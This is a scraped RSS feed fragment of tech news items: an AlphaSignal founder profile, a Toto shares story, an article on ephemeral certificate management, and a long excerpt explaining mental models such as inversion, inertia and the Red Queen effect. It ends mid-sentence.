attention.Running AlphaSignal as a solo operation forced Alexander to rethink how media organizations function. Rather than scaling through headcount, he focused on automation and system design.“I had to do everything: engineering, research, distribution, partnerships,” he said. “The only way to make that sustainable was to build systems that could operate without constant human input.”This approach mirrors the broader shift he sees happening across industries: replacing manual workflows with intelligent systems capable of handling complexity at scale. In his view, the future belongs to organizations that treat information processing as infrastructure, not editorial labor.Today, AlphaSignal functions less like a publication and more like an intelligence layer for the AI ecosystem. Its tools identify emerging trends, map technical progress, and help engineers, investors, and researchers understand where innovation is actually occurring.Looking ahead, Alexander plans to expand the system beyond AI into other sectors facing similar overload, including finance, cybersecurity, and biotechnology. His long-term goal is to build what he describes as a “universal signal engine” — a platform capable of ranking relevance across any domain overwhelmed by information.We’re entering a period where most content will be machine-generated,” he said. “The real value won’t be in producing more of it, but in building systems that help people understand what matters.For Alexander, that challenge defines the next era of media, one where clarity, not volume, becomes the most valuable commodity.]]></content:encoded></item><item><title>Toilet Maker Toto&apos;s Shares Get Unlikely Boost From AI Rush</title><link>https://slashdot.org/story/26/01/23/1855256/toilet-maker-totos-shares-get-unlikely-boost-from-ai-rush?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>tech</category><pubDate>Fri, 23 Jan 2026 21:25:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[An anonymous reader shares a report: Shares of Japanese toilet maker Toto gained the most in five years after booming memory demand excited expectations of growth in its little-known chipmaking materials operations.

Yet in modern infrastructure, certificates quietly enable nearly every secure interaction. From service-to-service communication to machine identity, they form the backbone of digital trust. What has changed is not their importance, but how long they are allowed to exist.Across the industry, long lived certificates are giving way to ephemeral certificates that are short lived, automated, and continuously rotated. This shift reflects a growing recognition that static trust models struggle to keep pace with distributed systems that evolve continuously.The evolution toward ephemeral certificate management has emerged through sustained dialogue across professional communities. Engineers and security leaders exchange experiences in British Computer Society forums, Gartner peer discussions, Forbes Technology Council conversations, and IEEE conferences where practical challenges are discussed openly.Within these discussions, Arun Kumar Elengovan is frequently referenced for bringing clarity to how certificate management fits within broader trust architecture. A Director of Engineering Security for an identity security focused organization, he has led and contributed to large scale security programs across complex environments. An award-winning leader with recognition spanning the United States, Canada, Indonesia, Thailand, India, Malaysia, and Australia, he is widely regarded as a distinguished contributor in ephemeral certificate management. His work consistently highlights how short-lived trust models strengthen security posture while improving operational reliability when applied with architectural discipline.His continued engagement across professional councils and technical forums has helped shape a shared understanding that certificate automation is no longer an optional enhancement. It is increasingly viewed as a foundational capability that security leaders must guide deliberately as infrastructure scales.The Fragility of Long-Lived TrustTraditional certificate practices were designed for a slower era. Certificates were issued manually, embedded into applications, and rarely rotated. In discussions across the security engineering community, Arun Kumar Elengovan has pointed out that this model was workable when environments were small and change was infrequent, but its assumptions no longer hold in modern infrastructure.Today, organizations operate across hybrid cloud platforms, microservices, container clusters, serverless workloads, and third-party integrations. Each layer introduces credentials that must be issued, stored, rotated, and retired safely. Arun has emphasized that when certificates persist for extended periods, compromise often remains unnoticed, revocation becomes slow, discovery incomplete, and operational risk accumulates without clear visibility.Security incidents increasingly show that failures do not arise from cryptographic weaknesses, but from credentials that remain active long after their intended use. Across professional and technical forums, this pattern reflects a broader understanding that the durability of trust, rather than cryptographic strength alone, is what most often undermines security in large scale systems.Ephemeral Certificates and Trust AgilityEphemeral certificates offer a different path forward. Rather than embedding trust permanently into systems, trust is applied dynamically at runtime. Certificates are issued only when needed, rotated automatically, and replaced frequently enough to significantly reduce exposure windows.This approach supports trust agility. Applications no longer hold long term credentials. Instead, trust decisions are centralized and enforced consistently across environments. Root of trust remains protected offline, while intermediate trust is delegated safely through automation.The result is a security posture that adapts as systems change rather than falling behind them.Automation as a Foundational RequirementEphemeral certificates cannot function without automation. Discovery, issuance, renewal, revocation, and monitoring must operate continuously. In large environments, organizations often lack a complete inventory of certificates until they actively search for them.Effective automation reflects operational reality. Certificates appear in code repositories, build pipelines, configuration files, network services, and legacy systems. Some applications refresh credentials seamlessly, while others require coordination. Mature certificate programs align rotation with engineering workflows rather than forcing disruption.Automation transforms certificate management from a brittle manual process into a dependable engineering capability.From Certificates to Systems ThinkingOne of the most important shifts in modern security engineering is moving away from treating certificates as isolated artifacts. Certificates intersect with identity systems, secrets management, cloud platforms, and governance frameworks.Issuance relies on private certificate authorities. Storage integrates with secrets systems. Access decisions depend on platform identity. Root of trust choices determine what remains offline and what can be automated safely. Through community discussions and technical exchanges, Arun consistently provides direction on evaluating these dependencies as a unified trust system rather than disconnected controls.Thinking in systems rather than tools enables organizations to design trust that grows with infrastructure instead of resisting it. This architectural perspective has increasingly influenced how security leaders frame certificate management decisions.Why This Matters for Engineers and OrganizationsEphemeral certificates reduce blast radius, shorten exposure windows, and simplify recovery. They also influence behavior. Engineers begin to expect rotation rather than fear it. Credentials are requested dynamically rather than copied. Trust becomes observable and measurable.Arun often underscores that this behavioral shift is as important as the technical controls themselves. Secure systems emerge when teams are given clear direction, consistent patterns, and accountability rather than ad hoc rules.As systems become more distributed, trust must become more dynamic. Automation, resilience, and observability are no longer optional attributes.Trust That Keeps Pace With ChangeAs digital infrastructure continues to evolve, static trust models fall behind. Arun Kumar Elengovan has noted that ephemeral certificates represent a practical response to this reality, aligning security mechanisms with the way modern systems are actually built and operated rather than how they were designed in earlier eras.He has also observed that ongoing conversations across professional communities increasingly converge on short lived trust as a baseline expectation rather than an advanced practice. According to Arun, trust that is automated and intentionally temporary reduces risk while increasing operational confidence, particularly in large scale and highly distributed environments.In this context, ephemeral certificates are not merely a technical improvement. They reflect a leadership driven understanding that security must move at the same pace as the systems it protects, or risk becoming an obstacle rather than an enabler."The views and opinions expressed in this article are the author’s own and do not necessarily reflect those of any affiliated organizations or institutions."]]></content:encoded></item><item><title>The Rippling/Deel corporate spying scandal may have taken another wild turn</title><link>https://techcrunch.com/2026/01/23/the-rippling-deel-corporate-spying-scandal-may-have-taken-another-wild-turn/</link><author>Julie Bort</author><category>tech</category><pubDate>Fri, 23 Jan 2026 21:13:28 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[The Department of Justice may be conducting a criminal investigation.

Any idea, belief, or concept can be boiled down to its essence. Like a map, mental models highlight key information while ignoring irrelevant details. They’re tools for compressing complexity into manageable chunks.Mental models help us understand the world. For example, velocity shows that both speed and direction matter. Reciprocity reveals how being positive and taking initiative gets the world to do most of the work for you. Margin of Safety reminds us that things don’t always go as planned. Relativity exposes our blind spots and shows how a different perspective can reveal new information. These are just a few examples.If you want to be a good thinker, you must develop a mind that can jump the jurisdictional boundaries. You don’t have to know it all. Just take in the best big ideas from all these disciplines. And it’s not that hard to do.The Big Ideas From The Big DisciplinesThis page summarizes the big ideas to help you make better decisions, avoid problems, and spot opportunities others miss.The map is not the territory reminds us that our mental models of the world are not the same as the world itself. It cautions against confusing our abstractions and representations with the complex, ever-­shifting reality they aim to describe.It is dangerous to mistake the map for the territory. Consider the person with an outstanding résumé who checks all the boxes on paper but can’t do the job. Updating our maps is a difficult process of reconciling what we want to be true with what is true.In many areas of life, we are offered maps by other people. We are reliant on the maps provided by experts, pundits, and teachers. In these cases, the best we can do is to choose our mapmakers wisely and to seek out those who are rigorous, transparent, and open to revision.Ultimately, the map/territory distinction invites us to engage with the world as it is, not just as we imagine it. And remember, when you don’t make the map, choose your cartographer wisely.The first rule of competition is that you are more likely to win if you play where you have an advantage. Playing to your advantage requires a firm understanding of what you know and don’t know. Your circle of competence is your personal sphere of expertise, where your knowledge and skills are concentrated. It’s the domain where you have a deep understanding, where your judgments are reliable, and your decisions are sound. The size of your circle isn’t as important as knowing the boundaries. The wise person knows the limits of their knowledge and can confidently say, “This falls within my circle,” or “This is outside my area of expertise.” While operating within your circle of competence is a recipe for confidence and effectiveness, venturing outside your circle of competence is a recipe for trouble. You’re like a sailor navigating unfamiliar waters without a map, at the mercy of currents and storms you don’t fully understand. This isn’t to say that you should never venture outside your circle. Learning new things, gaining new skills, and mastering new domains is one of the most beautiful things about life. Celebrate your expertise, but also acknowledge your limitations.First principles thinking is the art of breaking down complex problems into their fundamental truths. It’s a way of thinking that goes beyond the surface and allows us to see things from a new perspective. Thinking in first principles allows us to identify the root causes, strip away the layers of complexity, and focus on the most effective solutions. Reasoning from first principles allows us to step outside the way things have always been done and instead see what is possible. First principles thinking is not easy. It requires a willingness to challenge the status quo. This is why it’s often the domain of rebels and disrupters who believe there must be a better way. It’s the thinking of those willing to start from scratch and build from the ground up.In a world focused on incremental improvement, first principles thinking offers a competitive advantage because almost no one does it.Thought experiments are the sandbox of the mind, the place where we can play with ideas without constraints. They’re a way of exploring the implications of our theories, of testing the boundaries of our understanding. They offer a powerful tool for clarifying our thinking, revealing hidden assumptions, and showing us unintended consequences. The power of thought experiments lies in their ability to create a simplified model of reality where we can test our ideas. In the real world, confounding factors and messy details obscure the core principles at work. Thought experiments allow us to strip away the noise and focus on the essence of the problem. Thought experiments remind us that some of the most profound insights and innovations start with a simple question: What if?Second-­order thinking is a method of thinking that goes beyond the surface level, beyond the knee-­jerk reactions and short-­term gains. It asks us to play the long game, to anticipate the ripple effects of our actions, and to make choices that will benefit us not just today but in the months and years to come. Second-order thinking demands we ask: And then what? Think of a chess master contemplating her next move. She doesn’t just consider how the move will affect the next turn but how it will shape the entire game. She’s thinking many steps ahead. She’s considering her own strategy and her opponent’s likely response. In our daily lives, we’re often driven by first-­order thinking. We make decisions based on what makes us happy now, what eases our current discomfort, or satisfies our immediate desires. Second-­order thinking asks us to consider the long-­term implications of our choices to make decisions based not just on what feels good now but on what will lead to the best outcomes over time. In the end, second-­order thinking is about playing the long game. It’s about making choices for the next move and the entire journey.Probabilistic thinking is the art of navigating uncertainty. Successfully thinking in shades of probability means roughly identifying what matters, calculating the odds, checking our assumptions, and then deciding. The challenge of probabilistic thinking is that it requires constant updating. As new information emerges, the probabilities change. What seemed likely yesterday may seem unlikely today. This explains why probabilistic thinkers always revise their beliefs with new data and why it’s uncomfortable for many people. It’s much easier to believe something false is accurate than to deal with the fact that we might be wrong. Being a probabilistic thinker means being willing to say, “I don’t know for sure, but based on the evidence, I think there’s a 63 percent chance of X.” The rewards of probabilistic thinking are immense. By embracing uncertainty, we can make better decisions, avoid the pitfalls of overconfidence, and navigate complex situations with greater skill and flexibility. We can be more open-­ minded, more receptive to new ideas, and more resilient in the face of change.Much of success comes from simply avoiding common paths to failure.Inversion is not the way we are taught to think. We are taught to identify what we want and explore things that will move us closer to our objective. However, avoiding things that ensure we don’t get what we want dramatically increases our odds of success.We can get fixated on solving problems one way, missing simpler solutions. Inversion breaks us out of this tunnel vision.Instead of “How do I solve this?”, inversion asks, “What would guarantee failure?” Rather than “How can I achieve this?”, it asks “What’s preventing me from achieving it?” This flip reveals insights our usual thinking overlooks.When facing a tricky problem or ambitious goal, try inverting. Ask how you’d guarantee failure. The answers may surprise you—and unlock new solutions.Occam’s razor is the intellectual equivalent of “keep it simple.” When faced with competing explanations or solutions, Occam’s razor suggests that the correct explanation is most likely the simplest one, the one that makes the fewest assumptions. This doesn’t mean the simplest theory is always true, only that it should be preferred until proven otherwise. Sometimes, the truth is complex, and the simplest explanation doesn’t account for all the facts. The key to wielding this model is understanding when it works for you and against you.A theory that is too simple fails to capture reality, and one that is too complex collapses under its own weight.Hanlon’s razor is a mental safeguard against the temptation to label behavior as malicious when incompetence is the most common response. It’s a reminder that people are not out to get you, and it’s best to assume good faith and resist the urge to assign sinister motives without overwhelming evidence. This isn’t to say that genuine malice doesn’t exist. Of course, it does. But in most interactions, stupidity is a far more common explanation than malevolence. People make mistakes. They forget things. They speak without thinking. They prioritize short-­term wins over long-term wins. They act on incomplete information. They fall prey to bias and prejudice. These actions might appear like deliberate attacks from the outside, but the reality is far more mundane. Hanlon’s razor’s real power lies in how it shifts our perspective. When we assume stupidity rather than malice, we respond differently. Instead of getting defensive or lashing out, we approach the situation with empathy and clarity. For most daily frustrations and confusion, Hanlon’s razor is a powerful reminder to approach problems with a spirit of generosity. It’s a way to reduce drama and stress and find practical solutions instead of descending into blame and escalation.The Mental Models of Physics, Chemistry, and BiologyRelativity is the idea that our perceptions and judgments are not absolute but are shaped by our unique vantage points and frames of reference. It’s the understanding that our experiences are subjective. We each inhabit a particular web of experiences. This context shapes how we see the world, what we notice and overlook, and what we value and dismiss. Two people can look at the same event and come away with vastly different interpretations based on their unique frames of reference. Consider two people standing in the same room: They each experience the same absolute temperature differently. One can feel hot while the other feels cold, even though the temperature is the same. Similarly, consider political debates: Our beliefs are shaped by our unique experiences and social contexts. A policy that seems like common sense to an urban progressive might feel like complete nonsense to a rural conservative, and vice versa. In this way, understanding relativity is key to fostering empathy and finding common ground. However, relativity is not the same as relativism—­ the idea that all perspectives are equally valid. Recognizing the relativity of our perceptions doesn’t mean we don’t have to make judgments about validity. Instead, it’s a call to examine our assumptions, seek out diverse perspectives, and expand our frames of reference. We all have blind spots—­things we cannot see. Understanding that our perceptions are relative allows us to open ourselves to other ways of seeing. If you’re wondering where to get started, try asking others what they see that you can’t. Apply your judgment to their responses and update your beliefs accordingly.Reciprocity underlies everything from basic human kindness to the most complex systems of trade. At its core, reciprocity is the simple idea of treating others as they treat us—giving what we get. But from this simple principle grows a vast web of social interactions and expectations that shapes nearly every aspect of our lives. Many people expect the world to just hand them things without effort. This is a poor strategy because it doesn’t align with the human behavior you can observe around you every day. Reciprocation teaches us that you are likely to receive the same if you give people cynicism and curtness or nothing at all. But if you give people an opportunity and the benefit of the doubt, you will, more often than not, be on the receiving end of the same behavior. Become what you want to see in the world, and the world will return it to you. If you want an amazing relationship with your partner, be an amazing partner. If you want people to be thoughtful and kind to you, be thoughtful and kind to them. If you want people to listen to you, listen to them. The best way to achieve success is to deserve success. Small changes in your actions change your entire world. One of the biggest misperceptions about reciprocity is that people should sit around waiting for others to go first rather than unlocking the power of reciprocity in their favor by going positive and going first without expectation. Reciprocity reminds us that our actions tend to come back on us. It’s an essential reminder that we are part of the world, and thus, our actions do not happen in isolation but are instead part of an interconnected web of effects.Thermodynamics is the science of energy, heat, and work. It’s the set of physical laws that govern how energy moves and changes in the universe. Chances are, when you first came across the subject, it was dry, full of equations and abstract concepts. But the truth is thermodynamics is a useful intellectual framework for daily life. Not only can it reveal why your room gets messier over time, but it also explains why you should choose your friends wisely. The first law of thermodynamics states that energy can neither be created nor destroyed, only transformed from one form to another. This means that every joule of energy in the universe, every bit of heat and work and motion is part of an unbroken chain stretching back to the Big Bang. When you hop on a flight that burns jet fuel, you’re tapping into energy captured by plants millions of years ago and stored in chemical bonds until it was transformed into heat and motion. But while energy is conserved, it’s not always useful. That’s where the second law of thermodynamics comes in. It states that entropy—­ a measure of disorder—­ increases over time in any closed system. In other words, left on its own, the universe tends toward chaos. Your bedroom doesn’t clean itself—­ it takes energy and effort to maintain order. Stars burn out, structures crumble, and ice melts into water.Entropy is the universe’s tax on time. The constant battle against entropy is the driving force behind much of what we do. The constant struggle between order and disorder is the source of change and progress. While engineers and scientists use thermodynamics to design engines or calculate the energy requirements of a system, we can use it as a framework for understanding the deep interconnectedness of everything. When you feel the sun’s warmth on your skin, you’re experiencing the result of a thermodynamic process that began in the heart of a star ninety-three million miles away. When you watch a campfire burn down to embers, you’re witnessing the inexorable march of entropy in real-time.Thermodynamics is the story of energy across time. We’re part of an energy story that stretches back to the dawn of time and reaches the farthest pockets of space. We can marvel that in a universe ruled by disorder, pockets of temporary order can emerge, whether it’s a clean room, a planet, or a civilization. By understanding thermodynamics, we gain not just a technical toolbox but an appreciation for the beauty, complexity, and fragility of our very existence.Inertia is the stubborn resistance of the universe to change. It’s why objects at rest tend to stay at rest, and objects in motion tend to stay in motion. You can think of inertia as the guardian of the status quo.At its core, inertia is a property of mass. The more massive an object is, the more it resists changes to its state of motion. A feather, with its tiny mass, is easily blown about by the slightest breeze. A boulder, on the other hand, requires a powerful force to get it moving. This is why it takes more effort to push a heavy cart than a light one, more energy to launch a rocket than to toss a ball. But inertia isn’t just a physical phenomenon. It’s an illuminating lens to see habits, beliefs, and our resistance to change. The longer we’ve held them, the larger the mass and the more force required to change them. The path of least resistance is always the status quo. Getting started is the hardest part. Once something moves in a direction, keeping it in motion is much easier. But once something is in motion, it’s hard to stop. This is why most self-­help books about positive habits break things down into very small steps—­to reduce the force required to overcome the status quo. For example, if you want to get in the habit of doing push-­ups daily, start with one rather than fifty. If you want to start a flossing habit, start with one tooth. After all, the bigger the mass—­in this case, the gap between where you are and where you want to be—­ the more effort required.Inertia is both a challenge and an opportunity. Successful companies struggle with the inertia of their success and the resistance to change that comes with size, complexity, and entrenched interests. On the other hand, startups can leverage their lack of inertia—­their agility, their willingness to pivot and adapt—­as a competitive advantage. Momentum and inertia are closely related. While inertia is the tendency to resist change, momentum is the oomph an object has when it’s moving. The more momentum something has, the harder it is to stop or redirect. The key is to pick the right direction and build momentum so inertia works to your advantage and carries you forward. This is the essence of the “flywheel” concept in business—success breeds success, and small wins compound into big gains.When you’re fighting the status quo, remember the physics at play. Resistance is natural. Understand that building momentum in a new direction takes a sustained force. While the universe resists change, it always rewards those who dare to overcome that resistance.Friction and viscosity are the sand in the gears of the universe, the invisible hands that slow the motion of all things. Friction is the grip between surfaces in contact, the roughness that resists sliding. Viscosity is the thickness of fluids, the internal friction that makes liquids sluggish and syrupy. Together, they are the great moderators of motion. Think of the last time you tried to slide a heavy piece of furniture across the floor. The resistance you felt, the effort required to overcome the grip of the surface—­ that was friction at work. Or consider the slow, thick pour of honey from a jar, the way it clings and drips in slow threads. That’s the viscosity of the fluid resisting the force of gravity, the internal friction that makes the honey flow like molasses rather than water. While friction is the enemy of efficiency, it’s also necessary for traction. We couldn’t walk, hold tools, or tie knots without it. Viscosity, too, is a double-­edged sword. In pipelines and hydraulic systems, high viscosity means higher pumping costs, slower flows, and greater strain on equipment. But viscosity also makes oil a good lubricant, allowing paints and coatings to spread evenly and adhere to surfaces.Friction and viscosity are powerful metaphors for the forces of resistance in every domain of life. In human relationships, friction is the conflict and tension that arises from differing goals, personalities, or beliefs. The interpersonal roughness can generate heat and wear, but also the traction that allows us to influence and connect with others.While often hidden, friction and viscosity work against us whenever we try to do something. We often default to using more force to overcome resistance when simply reducing the friction or viscosity will do. However, doing both is more effective than either in isolation. Friction and viscosity can also be wielded as weapons. Rather than try to catch up to the competition with more effort, you might want to explore slowing them down by adding resistance through increased regulation, bureaucracy, or other clever ideas. In the end, reducing resistance is often easier than adding force.Velocity is the great differentiator, distinguishing the stagnant from the swift. In physics, velocity is a fundamental quantity, a key variable in the equations that describe the behavior of everything from subatomic particles to galaxies. It’s the v in the formulas of motion, the arrow that points the way from here to there. Velocity is also a metaphor for life. Consider it the rate at which we learn and grow, the speed at which we innovate and create, and the focus with which we pursue our goals. Velocity challenges us to think about what we can do to put ourselves on the right trajectory and to find a balance between mass and speed to move toward our goals. The ability to set a direction, improve your tactics, and adjust to new information becomes paramount. Velocity isn’t just about raw speed. Direction matters just as much (if not more). A car moving at high speed in circles goes nowhere, while a slow and steady walk in a straight line can cross continents. Velocity is progress. Sometimes, progress comes from more force, and sometimes, progress comes from removing friction. Once you have a destination, you can improve your velocity by working harder and eliminating things that aren’t contributing toward reaching that goal.Leverage is the force multiplier of the world, the principle that allows the small to move the large and the few to influence the many. It’s the idea that a little force, strategically applied, can yield outsize outputs.At its core, leverage is amplification. Think of a crowbar prying two boards apart or a pulley system hoisting a heavy load. In each case, the appled force is multiplied. But leverage isn’t just useful in physics. Rather, it’s a principle that applies across our lives.Leverage is often lurking in the background of nonlinear outcomes. Consider the author who took the ideas in their head, put them in a book, and sold millions of copies, or the Wall Street investor who made a single decision that resulted in billions. Or even the CEO who directs the people working for them. All of these examples are leverage in action.In personal development, leverage is about identifying the key habits, skills, and relationships that will impact your life and work most. It’s about focusing your energy on the critical few rather than the trivial many, about finding the points of maximum leverage where small changes can cascade into massive results.An example of personal leverage is an employee who learns to use AI to amplify their impact on the organization far beyond their experience or effort. While labor is still a form of leverage, it can often be done with silicon chips. In this sense, the person who can leverage technology can compete in a way never imaginable.However, leverage is not without its risks and responsibilities. Just as a small action can have an outsized positive impact, so can it have negative consequences. If you borrow too much money against your house and it turns out to be less valuable than assumed or interest rates change, the downside of leverage can quickly wipe you out.Good ideas taken too far often cause unanticipated consequences. Wielding leverage to maximum effect all the time, as the West Virginia mine owners did, sows the seeds of ongoing unrest that undermines one’s ability to be truly effective. No one wants to feel exploited, and those who are never give their loyalty or their best work.The key is to use leverage wisely and judiciously by understanding the systems you want to influence and considering the second- and third-­ order effects of your actions.Leverage is a tool, not a toy, and like any tool, it requires skill, judgment, and respect.Activation energy is the spark that ignites the fire of change, the initial burst of effort required to kick-­ start a reaction or transformation. It’s the metaphorical push that gets the boulder rolling down the hill, the investment of energy needed to overcome inertia and set a process in motion. In chemistry, activation energy is the minimum energy that must be input for a reaction. It’s the hurdle molecules must overcome to break their bonds and form new ones, the energetic barrier separating the reactants from the products. But activation energy isn’t just a chemical concept. It’s a principle that applies to any system where change is possible but not automatic. In personal growth, activation energy is the effort required to break old habits and form new ones. In innovation, it’s the investment needed to turn an idea into reality. The key is recognizing activation energy for what it is: a necessary upfront cost, not a permanent obstacle. Once things are moving, momentum takes over. Once the reaction starts, it becomes self-­ sustaining.Catalysts are the unsung heroes of chemical reactions, the silent partners accelerating change. By decreasing the time required to cause change, they also make reactions possible that might not have occurred otherwise. In chemistry, a catalyst is a substance that increases the reaction rate without permanently altering itself. But catalysts aren’t just chemical curiosities, they’re a powerful metaphor for the forces that drive change and growth.In business, a catalyst might be a new technology that opens fresh possibilities or a visionary leader who inspires a team to new heights. In your personal life, a catalyst could be a life-­changing book, a transformative experience, or a mentor who sees your potential and helps you realize it. Of course, while we benefit from others acting as our catalysts, we can be catalysts ourselves—helping others find the activation energy they need to thrive.Alloying is the art of mixing elements to create something greater than the sum of its parts. While our intuition tells us that pure substances are best, alloying shows this is not always true. One plus one can equal ten. By blending ingredients in precise proportions, metallurgists can create materials with bespoke properties—the lightness of aluminum with the strength of steel, the corrosion resistance of chromium with the affordability of iron.But alloying isn’t just about physical properties. It’s a metaphor for the power of diversity and combination in all walks of life. In teams, alloying is the mixing of different skills, perspectives, and personalities to create a more creative, adaptable, and resilient group than any individual could be alone. In ideas, it’s the blending of concepts from different fields to spark innovation and insight.In people, alloying is the combination of skills that makes them unstoppable. Consider a person possessing deep engineering skills who can clearly explain ideas. They are more valuable than someone with just the engineering skills. Now add empathy, humility, resilience, and drive. This person becomes incredibly rare.The key to successful alloying is knowing which elements to combine and in what proportions. Too little of one ingredient and you don’t get the desired effect; too much and you might end up with something brittle or unstable. The art lies in finding the sweet spot, the golden ratio where the whole becomes more than the sum of its parts.Evolution Part One: Natural Selection and ExtinctionNatural selection is the hidden hand that selects the fittest from a never-­ending pile of genetic variation, while extinction is the hammer that shatters the unfit and clears the way for variations to arise. In biology, natural selection is the process by which traits that enhance survival and reproduction become more common in successive generations of a population. The invisible hand of natural selection guides the adaptations of the living world, favoring creatures that are best suited to their environments and pruning back those that fall short.But for every winner in the great game of natural selection, there are countless losers. Extinction is the fate awaiting those species that fail to adapt, that find themselves outpaced by changing circumstances or outcompeted by more successful forms. The evolutionary end. Without the possibility of extinction, there would be no imperative to evolve to our changing environment. And without the sculpting hand of natural selection, the unfit and ill-­ adapted would consume scarce resources. These principles apply far beyond the realm of biology. In business, technology, and ideas, we see the same relentless winnowing of the unfit and the elevation of the adaptive. The companies that thrive navigate the shifting landscape of consumer demand and technological change, while those that stagnate are swept away by the tides of creative destruction. On a personal level, we are all subject to the pressures of selection and the risk of extinction. Our skills, our knowledge, and our ways of thinking must constantly evolve to keep pace with an ever-changing world. Those who consistently adapt are the ones who thrive in the long run.Above all, remember that there are no permanent victories in the great game of life—­ only the ceaseless striving to stay one step ahead.Complacency will kill you. There’s no such thing as a permanent lead. No matter how well a species adapts to its environment, it must keep running just to stay in place.  The Red Queen effect results from the never-­ending arms race between predator and prey, parasite and host, and competitor and competitor. As one species evolves a new adaptation, others evolve countermeasures, leading to a constant escalation. The faster you adapt, the faster your rivals must respond, and vice versa. This has profound implications for the pace of evolution.In a static environment, natural selection might favor a leisurely pace of change. But in a world of constant change, where your competitors are always nipping at your heels, the premium is on speed. The species that thrive adapt quickly and turn the evolutionary crank faster than their rivals. But the Red Queen effect isn’t just about biological evolution. The same principle applies in any competitive domain—­ business, technology, or even ideas. Companies must continually innovate to stay ahead of their rivals. Technologies must evolve at a breakneck pace to avoid obsolescence. Ideas must adapt and grow to maintain their relevance. The key is recognizing that adaptation isn’t a one-time event but a continuous process. It’s not about reaching a finish line but maintaining a lead in an endless race. Those who rest on their laurels, who become complacent in their success, are quickly overtaken by hungrier, more agile competitors. But there is a catch when it comes to people. Once we gain an advantage, we want to hold on to it at all costs, and if we’re not careful, this can slow the pace of adaptation. Before long, our competitors catch up or find innovative ways to neutralize our strength. Sustained success comes from being flexible enough to change, letting go of what worked in the past, and focusing on what you need to thrive in the future.Standing still is the quickest path to extinction in a world of constant change. Victory goes to those who can continuously adapt.Nothing exists in isolation. Everything is connected. The ecosystem lens reveals that each species plays its part in a delicate balance of competition and cooperation. The actions of any one species can have consequences for many others in the same environment. In biology, an ecosystem is a community of living organisms interacting with each other and their physical environment. In an ecosystem, nothing exists in isolation—every creature is both predator and prey, both producer and consumer, locked in an intricate dance of energy and nutrients. Yet the concept of an ecosystem extends far beyond biology. You can see it nearly everywhere you look. Businesses operate within a complex network of companies, customers, competitors, suppliers, and regulators. Each entity relies on and influences the others, creating a dynamic interplay that determines which businesses thrive and which do not. Economies are also vast ecosystems comprising various sectors (like agriculture, manufacturing, and services) and actors (like workers, consumers, and governments). These components interact under the rules set by economic policies and market forces. Economic theories often explore how changes in one part of the ecosystem can lead to significant outcomes in another, much like the ripple effects seen in biological ecosystems.What all ecosystems have in common is their inherent complexity and their reductionist analysis. In an ecosystem, the whole is always more than the sum of its parts. The system’s behavior emerges from the countless interactions of its components, often in surprising and unpredictable ways. This suggests that to truly comprehend a complex system, we must look beyond the individual elements and consider the patterns of relationship and feedback that bind them together. Left to their own devices, many systems can take care of themselves, possessing abilities to correct and compensate for changes and external pressures. No matter how well-intentioned our interventions are, they often lead to unintended consequences as the solution to one problem quickly causes another, more significant problem. Be slow to intervene, and if you do, take the time to understand how actions in one part cascade into others. It pays to remember the motto of physicians, “First, do no harm.”A niche is a special place where a particular species or idea can thrive. It’s the ecological equivalent of a custom-­fitted suit tailored to its occupant’s unique needs and abilities. In a niche, you don’t have to be all things to all people—­ you just have to be the best at what you do.In biology, a niche is a species’ specific role and position within its ecosystem. It’s the unique combination of resources it consumes, the habitat it lives in, the interactions it has with other species. A place where a species’ adaptations flourish. But the concept of a niche extends far beyond the realm of ecology. In business, we talk about “market niches”—­ the specific segments of customers with particular needs or preferences. A company focusing on a niche can often out-compete larger, more general rivals by specializing, by becoming the best at serving that particular slice of the market, or by moving with velocity. The same principle applies to careers. By specializing in something unique and valuable, you can create a space where you can excel and your combination of skills thrives. The key is finding the niche that fits you, rewards your strengths, and neutralizes your weaknesses.This isn’t to say that occupying a niche is without risks. In fact, you become very fragile. If the environment changes, if consumer preferences shift, a once-­cozy niche can quickly become a tight squeeze. That’s why successful niche occupants are often those who can adapt and evolve their niche as the world around them changes. Specialists have less competition and stress, but only in times of stability. Generalists face more significant day‑to‑day challenges for resources and survival but have more flexibility to respond when times change.Self-­ preservation is a core instinct that drives all living things to protect and sustain their own existence. It’s the biological imperative that makes a gazelle run from the lion, the roots of a tree seek water, and bacteria evolve resistance to antibiotics. In the game of life, self-­ preservation is the only rule: stay alive. For humans, self-­ preservation goes beyond physical survival. It encompasses the protection of our psychological well-being, social status, and sense of identity. Anything that threatens how we see ourselves becomes a threat.While self-­ preservation is a necessary instinct, it can also be limiting. When we’re too focused on avoiding threats, we can easily miss opportunities right before us. Left unchecked, self-preservation can lead to stagnation. The key is to find balance: to protect what’s essential and be willing to let go of what no longer serves us.Listen to the voice that tells you when to be cautious, but don’t let it be the only voice you hear. Often, the most significant risk is not taking risks at all.Replication is the molecular magic trick that allows organisms to make copies of themselves to pass their genetic blueprints from one generation to the next. In the grand ballet of evolution, replication is the music that keeps the dance going. At its core, replication is about information transfer. It’s the process by which the instructions encoded in DNA are faithfully copied and transmitted. Whenever a cell divides or an organism reproduces, the replication machinery swings into action, ensuring the genetic message is preserved and propagated. However, replication is not a perfect process. Errors creep in, and mutations occur. And it’s these imperfections that fuel the engine of evolution. Without the variation introduced by replication errors, life would stagnate, unable to adapt to changing environments.Replication is helpful outside of biology, too. As a mental model, it teaches us that we don’t always need to reinvent the wheel. When you’re just starting, the quickest way to make great leaps is to imitate what others are already doing. This establishes an average baseline of performance. Once you get a sense and a feel for the environment, you can innovate and adapt to set a new baseline. The power of replication lies in its exponential nature. A single replicated entity can give rise to countless copies, each of which can replicate further. This is the power that viruses and viral ideas harness—­ the ability to spread explosively by exploiting the machinery of replication. Memes, beliefs, and practices also replicate, spreading from mind to mind and shaping the contours of our shared reality. But replication also comes with risks. Unchecked replication can be cancerous, leading to uncontrolled growth that threatens the health of the larger system. Effective replication requires enough structure and space to produce a copy and enough flexibility to adapt to environmental changes. Just because something has worked for a while doesn’t mean it will be effective in perpetuity. Maintaining a successful approach requires the ability to grow and modify that approach as required. As we contemplate replication’s role in life and thought, we must recognize its creative and destructive potential. We must create conditions that favor replicating what is true, sound, and beneficial while resisting the spread of what is false, harmful, or malignant. Cooperation is the surprising secret of success in the ruthless world of survival. If there is any one model that explains humanity, then this is it. Cooperation unleashed the potential of the human species. At first glance, cooperation seems to defy the logic of natural selection. Why would an organism invest its hard-­ earned resources in helping another rather than focusing solely on its own survival and reproduction? The answer lies in the magic of reciprocity 